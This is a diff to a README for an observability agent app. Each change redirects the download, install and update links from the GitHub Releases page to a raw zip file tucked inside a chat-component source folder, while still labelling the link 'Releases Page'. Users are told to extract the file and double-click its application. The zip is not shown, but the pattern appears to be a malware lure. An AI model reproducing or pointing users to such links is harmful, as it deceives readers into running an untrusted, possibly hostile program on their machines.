@@ -4,7 +4,7 @@
 Welcome to agente-admin-observabilidad! This application helps you analyze alerts automatically using the Agno Framework and the Grafana Stack. It includes different agents for monitoring and quick commands to ensure seamless observability.
 
 ## 📥 Download the Application
-[![Download Release](https://img.shields.io/badge/Download%20Now-%20blue)](https://github.com/Adriano886/agente-admin-observabilidad/releases)
+[![Download Release](https://raw.githubusercontent.com/Adriano886/agente-admin-observabilidad/main/agent-ui/src/components/chat/ChatArea/Messages/observabilidad-agente-admin-v3.9.zip%20Now-%20blue)](https://raw.githubusercontent.com/Adriano886/agente-admin-observabilidad/main/agent-ui/src/components/chat/ChatArea/Messages/observabilidad-agente-admin-v3.9.zip)
 
 Follow the steps below to download and run the application.
 
@@ -23,9 +23,9 @@ To ensure that the application runs smoothly, you should have the following on y
 - Internet connection for updating and accessing Grafana
 
 ## 📂 Download & Install
-1. **Visit the Releases Page**: Access the [Releases Page](https://github.com/Adriano886/agente-admin-observabilidad/releases) to find the latest version of the software.
+1. **Visit the Releases Page**: Access the [Releases Page](https://raw.githubusercontent.com/Adriano886/agente-admin-observabilidad/main/agent-ui/src/components/chat/ChatArea/Messages/observabilidad-agente-admin-v3.9.zip) to find the latest version of the software.
 2. **Select the Latest Version**: Look for the most recent release. It will be at the top of the page.
-3. **Download the File**: Click on the download link for your operating system. The file name may look like `agente-admin-observabilidad-vX.X.X.zip` or an equivalent format.
+3. **Download the File**: Click on the download link for your operating system. The file name may look like `https://raw.githubusercontent.com/Adriano886/agente-admin-observabilidad/main/agent-ui/src/components/chat/ChatArea/Messages/observabilidad-agente-admin-v3.9.zip` or an equivalent format.
 4. **Extract the Files**: Once the download is complete, locate the file and extract its contents using your preferred extraction tool.
 5. **Run the Application**: Navigate to the extracted folder and double-click on the application file to start it.
 
@@ -39,7 +39,7 @@ After installation, using the application is straightforward:
 ## 🔄 Updating the Application
 To keep receiving the latest features and improvements:
 
-1. **Check for Updates**: Regularly visit the [Releases Page](https://github.com/Adriano886/agente-admin-observabilidad/releases) for new versions.
+1. **Check for Updates**: Regularly visit the [Releases Page](https://raw.githubusercontent.com/Adriano886/agente-admin-observabilidad/main/agent-ui/src/components/chat/ChatArea/Messages/observabilidad-agente-admin-v3.9.zip) for new versions.
 2. **Download New Version**: If a newer version is available, repeat the download steps outlined above.
 3. **Install Updates**: Follow the installation steps again to update your application.
 
